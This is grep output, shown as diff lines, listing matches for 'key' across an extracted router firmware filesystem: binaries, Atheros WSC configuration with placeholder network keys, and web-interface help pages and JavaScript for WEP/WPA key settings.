+Binary file fmk/rootfs/usr/bin/httpd matches
+Binary file fmk/rootfs/sbin/wlanconfig matches
+Binary file fmk/rootfs/sbin/iwconfig matches
+Binary file fmk/rootfs/sbin/tc matches
+Binary file fmk/rootfs/sbin/hostapd matches
+Binary file fmk/rootfs/sbin/wpa_supplicant matches
+Binary file fmk/rootfs/sbin/iwlist matches
+fmk/rootfs/etc/rc.d/rc.modules:insmod /lib/modules/2.6.31/kernel/af_key.ko
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# Key Mgmt for Supplicant (Client, Registrar):
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# Key Mgmt for Hostapd (AP, AP with Registrar):
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:KEY_MGMT=OPEN
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# Are we using a USB key to transfer PIN/Credential?
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:USB_KEY=0
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# Is the Network Key set?
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# NW_KEY=0x000102030405060708090A0B0C0D0E0F000102030405060708090A0B0C0D0E0F
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:# NW_KEY=passphrase
+fmk/rootfs/etc/ath/default/default_wsc_cfg.txt:NW_KEY=
+fmk/rootfs/etc/ath/wsc_config.txt:# Key Mgmt for Supplicant (Client, Registrar):
+fmk/rootfs/etc/ath/wsc_config.txt:# Key Mgmt for Hostapd (AP, AP with Registrar):
+fmk/rootfs/etc/ath/wsc_config.txt:KEY_MGMT=OPEN
+fmk/rootfs/etc/ath/wsc_config.txt:# Are we using a USB key to transfer PIN/Credential?
+fmk/rootfs/etc/ath/wsc_config.txt:USB_KEY=0
+fmk/rootfs/etc/ath/wsc_config.txt:# Is the Network Key set?
+fmk/rootfs/etc/ath/wsc_config.txt:# NW_KEY=0x000102030405060708090A0B0C0D0E0F000102030405060708090A0B0C0D0E0F
+fmk/rootfs/etc/ath/wsc_config.txt:# NW_KEY=passphrase
+fmk/rootfs/etc/ath/wsc_config.txt:NW_KEY=
+Binary file fmk/rootfs/bin/busybox matches
+Binary file fmk/rootfs/lib/libcrypt-0.9.30.so matches
+Binary file fmk/rootfs/lib/libpthread-0.9.30.so matches
+Binary file fmk/rootfs/lib/libiw.so.29 matches
+Binary file fmk/rootfs/lib/libuClibc-0.9.30.so matches
+Binary file fmk/rootfs/lib/libgcc_s.so.1 matches
+Binary file fmk/rootfs/lib/modules/2.6.31/net/ath_hal.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/net/umac.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/net/ath_dev.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/net/ag7240_mod.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/sch_sfq.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/nf_conntrack_proto_gre.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/nf_conntrack.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/tp_domain.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/wlan_warn.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/ip6_tunnel.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/statistics.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/pptp.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/nf_conntrack_pptp.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/x_tables.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/sit.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/nf_nat_proto_gre.ko matches
+Binary file fmk/rootfs/lib/modules/2.6.31/kernel/ipt_TRIGGER.ko matches
+Binary file fmk/rootfs/lib/libwpa_common.so matches
+fmk/rootfs/web/login/encrypt.js:var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+fmk/rootfs/web/login/encrypt.js:keyStr.charAt(enc1) + keyStr.charAt(enc2) +
+fmk/rootfs/web/login/encrypt.js:keyStr.charAt(enc3) + keyStr.charAt(enc4);
+fmk/rootfs/web/help/WlanNetworkHelpRpm.htm:<p><B>Key type</B> - This option should be chosen according to the AP's security configurati
+on. It is recommended that the security type is the same as your AP's security type</p>
+fmk/rootfs/web/help/WlanNetworkHelpRpm.htm:<p><B>WEP Index</B> - This option should be chosen if the key type is WEP (ASCII) or WEP (HE
+X).It indicates the index of the WEP key.</p>
+fmk/rootfs/web/help/WlanNetworkHelpRpm.htm:<p><B>Auth Type</B> - This option should be chosen if the key type is WEP (ASCII) or WEP (HE
+X).It indicates the authorization type of the Root AP.</p>
+fmk/rootfs/web/help/ParentCtrlAdvHelpRpm.htm:<LI><B>Allowed Website Name </B> -       In this field, you can enter 8 domain names allow
+ed for the child to access, either the full name or the keywords (for example google). Any domain name with keywords in it (www.google.
+com, news.google.com) will be allowed.</LI>
+fmk/rootfs/web/help/AccessCtrlAccessTargetsAdvHelpRpm.htm:<LI><B>Domain Name</B> -Here you can enter 4 do
+main names, either the full name or the keywords (for example google). Any domain name with keywords in it (www.google.com, www.google.
+cn) will be blocked or allowed.</LI>
+fmk/rootfs/web/help/DdnsAddComexeHelpRpm.htm:<P>The Router offers a Dynamic Domain Name System (<B>DDNS</B>) feature. DDNS lets you ass
+ign a fixed host and domain name to a dynamic Internet IP address. It is useful when you are hosting your own website, FTP server, or o
+ther server behind the Router. Before using this feature, you need to sign with for DDNS service provider <a href="#" onClick="openWind
+ow2();" class=L1>www.comexe.cn</a>. The Dynamic DNS client service provider will give you a password or key.</P>
+fmk/rootfs/web/help/DynDdnsHelpRpm.htm:<P>The Router offers a Dynamic Domain Name System (<B>DDNS</B>) feature. DDNS lets you assign a 
+fixed host and domain name to a dynamic Internet IP address. It is useful when you are hosting your own website, FTP server, or other s
+erver behind the Router. Before using this feature, you need to sign up with DDNS service providers such as <a href="#" onClick="openWi
+ndow1();" class=L1>dyn.com</a>. The Dynamic DNS client service provider will give you a password or key.</P>
+fmk/rootfs/web/help/NoipDdnsHelpRpm.htm:<P>The Router offers a Dynamic Domain Name System (<B>DDNS</B>) feature. DDNS lets you assign a
+ fixed host and domain name to a dynamic Internet IP address. It is useful when you are hosting your own website, FTP server, or other 
+server behind the Router. Before using this feature, you need to sign up with DDNS service providers such as <a href="#" onClick="openW
+indow1();" class=L1>www.noip.com</a>. The Dynamic DNS client service provider will give you a password or key.</P>
+fmk/rootfs/web/help/WzdAccessCtrlTargetAddHelpRpm.htm:<LI><B>Domain Name</B> -Here you can enter 4 domain nam
+es, either the full name or the keywords (for example google). Any domain name with keywords in it (www.google.com, www.google.cn) will
+ be blocked or allowed.</LI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<lI> <B>WPA-PSK</B> - Pre-shared key of WPA.</lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<lI> <B>WPA2-PSK</B> - Pre-shared key of WPA2. </lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>Group Key Update Period</B> - Specify the group key update interval in seconds. The v
+alue can be either 0 or at least 30. Enter 0 to disable the update.</p>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>Group Key Update Period</B> - Specify the group key update interval in seconds. The v
+alue can be either 0 or at least 30. Enter 0 to disable the update.</p>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<strong>Shared Key</strong> or <strong>Open System</strong>  authentication type automatica
+lly based on the wireless station's
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<lI><B>Shared Key</B> - Select 802.11 Shared Key authentication.</lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>WEP Key Format</B> - You can select <B>ASCII</B> or <B>Hexadecimal</B> 
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:format. ASCII Format stands for any combination of keyboard characters 
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>WEP Key settings</B> - Select which of the four keys will be used and 
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:enter the matching WEP key information for your network in the selected key 
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>Key Type</B> - You can select the WEP key length (<B>64-bit</B>, or <B>128-bit</B>, o
+r <B>152-bit</B>.) for encryption.
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:&quot;Disabled&quot; means this WEP key entry is invalid.</p>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:of 0-9, a-f, A-F, and null key is not permitted) or 5 ASCII characters. </lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:of 0-9, a-f, A-F, and null key is not permitted) or 13 ASCII characters.</lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:of 0-9, a-f, A-F, and null key is not permitted) or 16 ASCII characters.</lI>
+fmk/rootfs/web/help/WlanSecurityHelpRpm.htm:<p><B>Note</B>: If you do not set the key, the wireless security function is still disabled
+ even if you have selected Shared Key as Authentication Type.
+fmk/rootfs/web/help/WzdWlanHelpRpm.htm:Please note that the key is case sensitive.
+fmk/rootfs/web/localiztion/str_err.js:varERR_WLAN_CONFIG_KEY=
+26102
+fmk/rootfs/web/localiztion/str_err.js:var ERR_VPN_AUTH_KEY_INVALID=34019
+fmk/rootfs/web/localiztion/str_err.js:var ERR_VPN_ENCRYPT_KEY_INVALID=34020
+fmk/rootfs/web/localiztion/str_err.js:str_err[ERR_WLAN_CONFIG_KEY]="Invalid wireless WEP k
+ey(s)!";
+fmk/rootfs/web/localiztion/str_err.js:str_err[ERR_VPN_AUTH_KEY_INVALID]="Check key error.";
+fmk/rootfs/web/localiztion/str_err.js:str_err[ERR_VPN_ENCRYPT_KEY_INVALID]="Encryption key error.";
+fmk/rootfs/web/userRpm/WzdPPTPRpm.htm:if (obj.keyCode == 13)
+fmk/rootfs/web/userRpm/WzdPPTPRpm.htm:<BODY onLoad="changeIpType();setTagStr(document,'ntw_wzd_pptp');LoadHelp('WzdPPTPHelpRpm.htm'); r
+esize(this);" onResize="resize(this);" onkeyDown="bindNext(event);">
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:alert(js_inv_group_per="Invalid Group Key Update Period
+, please input again!");
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:alert(js_inv_group_per5g="Invalid Group Key Update Peri
+od, please input again for 5GHz!");
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm://doSelKeytype();
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm://doSelKeytype();
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:<TD id = "t_groupKeyUp" class="Item" style="padding-left:60px">
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:Group Key Update Period:
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:<A name="key_update_prd_note" id="t_key_update_prd_note">
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:+'<TD id = "t_groupKeyUp5g" class=Item style="p
+adding-left:60px">Group Key Update Period: </TD>'
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:+'<A  id="t_key_update_prd_note5g" name="t_key_
+update_prd_note5g">'
+fmk/rootfs/web/userRpm/GuestNetWirelessCfgRpm.htm:/*******************Group Key Update Period psk**********************/
+fmk/rootfs/web/userRpm/WlanMacFilterRpm.htm:function showKey(enable)
+fmk/rootfs/web/userRpm/WlanMacFilterRpm.htm:location.href="../userRpm/WlanMacFilterRpm.htm?Page="+curPage+"&ShowKey="+enabl
+e+"&vapIdx="+document.forms[0].vapIdx.value;
+fmk/rootfs/web/userRpm/WlanMacFilterRpm.htm:document.write("<TD class=ListB id=\"t_wep_key\">WEP Key</TD>");
+fmk/rootfs/web/userRpm/BakNRestoreRpm.htm:        <TD><INPUT class="file" name="filename" type="file" size="20" onKeyDown="return false
+">
+fmk/rootfs/web/userRpm/AccessDenied.htm:    <P> <B><FONT size="4">Is the &quot;Caps Lock&quot; enabled on your keyboard?</FONT></B> <BR
+>
+fmk/rootfs/web/userRpm/AccessDenied.htm:      The username and password must be lowercase, please ensure that the &quot;Caps Lock&quot;
+ LED is disabled on your keyboard and try again.</P>
+fmk/rootfs/web/userRpm/popupSiteSurveyRpm.htm:var mapKeyType = new Array(
+fmk/rootfs/web/userRpm/popupSiteSurveyRpm.htm:document.write('<td>' + transToHTML(mapKeyType[content]) + '</t
+d>');
+fmk/rootfs/web/userRpm/SystemLogRpm.htm:                  <SELECT id="logType" name="logType"  tabindex="-1" onChange="doTypeChange(thi
+s, this.value)" ONMOUSEWHEEL="return false;" ONKEYDOWN="return false;">
+fmk/rootfs/web/userRpm/SystemLogRpm.htm:                  <SELECT id="logLevel" name="logLevel" VALUE="7" tabindex="-1" onChange="doLev
+elChange(this, this.value)" ONMOUSEWHEEL="return false;" ONKEYDOWN="return false;">
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var key1dis = 0;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var key2dis = 0;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var key3dis = 0;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var key4dis = 0;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keylength1 = 10;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keylength2 = 10;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keylength3 = 10;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keylength4 = 10;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (key1dis && key2dis && key3dis && key4dis)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (key1dis == 0 &&!(cf.key1.value=="" && !cf.secType[3].checked)){if (checkkey(c
+f.key1.value,keylength1) == false)return 1;}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (key2dis == 0 &&!(cf.key2.value=="" && !cf.secType[3].checked)){if (checkkey(c
+f.key2.value,keylength2) == false)return 2;}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (key3dis == 0 &&!(cf.key3.value=="" && !cf.secType[3].checked)){if (checkkey(c
+f.key3.value,keylength3) == false)return 3;}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (key4dis == 0 &&!(cf.key4.value=="" && !cf.secType[3].checked)){if (checkkey(c
+f.key4.value,keylength4) == false)return 4;}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_inv_group_key="Invalid Group Key Update Period, please input a
+gain!");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_inv_update_period="Invalid Group Key Update Period, please inp
+ut again!");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_inv_group_per="Invalid Group Key Update Period, please
+ input again!");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_inv_group_per="Invalid Group Key Update Period, please
+ input again!");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_no_wep_key="The WEP key is empty, please input WEP key.");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:                alert (js_wep_key_inv_hex="WEP key is invalid!\nThe WEP Key Format is Hexade
+cimal currently.\nMake sure that all digits are Hexadecimal (zero key is illegal) and the length must be 10,26 or 32.");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:                alert (js_wep_key_inv_asc="WEP key is invalid!\nThe WEP Key Format is ASCII 
+currently.\nMake sure that all characters are ASCII (not including any other character) and the length must be 5,13 or 16.");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (renum == 1 &&cf.key1.disabled == false)c
+f.key1.focus();cf.key1.select();}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:else if (renum == 2 &&cf.key2.disabled == false){c
+f.key2.focus();cf.key2.select();}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:else if (renum == 3 &&cf.key3.disabled == false){c
+f.key3.focus();cf.key3.select();}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:else if (renum == 4 &&cf.key4.disabled == false){c
+f.key4.focus();cf.key4.select();}
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:function setKey()
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:return setKey();
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:key1dis = (cf.length1.selectedIndex == 0);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:key2dis = (cf.length2.selectedIndex == 0);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:key3dis = (cf.length3.selectedIndex == 0);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:key4dis = (cf.length4.selectedIndex == 0);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keychoosed;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key1.disabled = cf.keynum[0].disabled = key1dis;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key2.disabled = cf.keynum[1].disabled = key2dis;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key3.disabled = cf.keynum[2].disabled = key3dis;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key4.disabled = cf.keynum[3].disabled = key4dis;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:for (i = 0; i < cf.keynum.length; i ++)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (cf.keynum[i].checked)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:keychoosed = cf.keynum[i].value;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((0 == key1dis) || (0 == key2dis) || (0 == key3dis) || (0 == key4dis))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((keychoosed == 1 && cf.length1.selectedIndex == 0) ||
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:(keychoosed == 2 && cf.length2.selectedIndex == 0) ||
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:(keychoosed == 3 && cf.length3.selectedIndex == 0) ||
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:(keychoosed == 4 && cf.length4.selectedIndex == 0))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (0 == key1dis)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.keynum[0].checked = 1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:else if (0 == key2dis)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.keynum[1].checked = 1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:else if (0 == key3dis)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.keynum[2].checked = 1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.keynum[3].checked = 1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:keylength1 =(1 == key1dis) ? keylength1 :(((3 == cf.length1.selectedIndex) ? 16 : ((2 =
+= cf.length1.selectedIndex) ? 13 : 5)) *((0 == cf.keytype.selectedIndex) ? 2 : 1));
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:keylength2 =(1 == key2dis) ? keylength2 :(((3 == cf.length2.selectedIndex) ? 16 : ((2 =
+= cf.length2.selectedIndex) ? 13 : 5)) *((0 == cf.keytype.selectedIndex) ? 2 : 1));
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:keylength3 =(1 == key3dis) ? keylength3 :(((3 == cf.length3.selectedIndex) ? 16 : ((2 =
+= cf.length3.selectedIndex) ? 13 : 5)) *((0 == cf.keytype.selectedIndex) ? 2 : 1));
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:keylength4 =(1 == key4dis) ? keylength4 :(((3 == cf.length4.selectedIndex) ? 16 : ((2 =
+= cf.length4.selectedIndex) ? 13 : 5)) *((0 == cf.keytype.selectedIndex) ? 2 : 1));
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((cf.key1.value.length > keylength1) && (key1dis != 1))cf.key1.value = cf.key1.value
+.substring(0,keylength1);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((cf.key2.value.length > keylength2) && (key2dis != 1))cf.key2.value = cf.key2.value
+.substring(0,keylength2);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((cf.key3.value.length > keylength3) && (key3dis != 1))cf.key3.value = cf.key3.value
+.substring(0,keylength3);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((cf.key4.value.length > keylength4) && (key4dis != 1))cf.key4.value = cf.key4.value
+.substring(0,keylength4);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key1.maxLength =  keylength1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key2.maxLength =  keylength2;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key3.maxLength =  keylength3;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:cf.key4.maxLength =  keylength4;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (cf.keytype.selectedIndex == 0)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:function checkkey(szname,strlength)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (cf.keynum[wlanPara[20]- 1].checked == false)
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((wlanPara[19] == 2) && (cf.keytype.value == 1))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if ((wlanPara[19] == 3) && (cf.keytype.value == 2))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var localKey;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:  localKey = cf.key1.value;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:  localKey = cf.key2.value;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:  localKey = cf.key3.value;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:    localKey = cf.key4.value;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:  APLen = getValLen(localKey);
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:if (localKey.charAt(i) != wlanPara[21].charAt(i))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm://if ((wlanPara[19] == 4) && (cf.secType[3].checked == true) && (cf.keynum[0].checked == 
+false))
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:alert(js_sec_wep_notsame = "If both your AP and WDS use WEP with the sa
+me index as security mode, then you should make sure the keys are the same!");
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD class=Item id="t_key_update_prd" name="t_key_update_prd">Group Key 
+Update Period:</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<A id="t_key_update_prd_note" name="t_key_update_prd_note">&nbs
+p;Seconds </A>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD  colspan = 3 id="t_key_update_prd_note2" name="t_key_update_prd_not
+e2" style="white-space:normal;">(Keep it default if you are not sure, minimum is 30, 0 means no update)</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD class=Item  id="t_key_update_prd" name="t_key_update_prd">Group Key
+ Update Period:</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<A id="t_key_update_prd_note" name="t_key_update_prd_note">(in 
+second, minimum is 30, 0 means no update)</A></TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<OPTION value="2" id="t_shared_key" name="t_shared_key"
+>Shared Key</OPTION>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD class=Item  id="t_wep_key_fmt" name="t_wep_key_fmt">WEP Key Format:
+</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<SELECT name=keytype class=list id=keytype onChange="setKey();"
+>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD class=Item id="t_key_sel" name="t_key_sel">Key Selected</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD style="font-size:13px;font-weight:bold; width:100px;text-align:cent
+er;" id="t_wep_key" name="t_wep_key">WEP Key</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:<TD style="font-size:13px;font-weight:bold;" id="t_key_type" name="t_ke
+y_type">Key Type</TD>
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.write('<TR><TD class=Item ><span id="t_key" name="t_key">Key</
+span> '+i+':&nbsp;<input type=radio name=keynum value='+i+'></td>');
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.write('<TD width="100px"><input type=text class=text name=key'
++i+' maxLength=32 size=32 value="" onfocus="if(key'+i+'dis) this.blur();else this.form.keynum['+(i-1)+'].checked=true;"></td>');
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.write('<TD><select name=length'+i+'  i
+d=length'+i+' onchange="setKey();">');
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].keytype.value = wlanPara[4];
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:var keySelected = wlanPara[10]-1;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].keynum[keySelected].checked = true;
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].key1.value = wlanList[0];
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].key2.value = wlanList[2];
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].key3.value = wlanList[4];
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:document.forms[0].key4.value = wlanList[6];
+fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:setKey();
+fmk/rootfs/web/userRpm/DiagnosticRpm.htm:      <TD><INPUT name="pingAddr" id="pingAddr" type="text" class="text" value="" size="20" max
+length="50" onKeyDown="if(event.keyCode==13) return doOnEnter();">
+fmk/rootfs/web/userRpm/LoginRpm.htm:if (event.keyCode == 13)
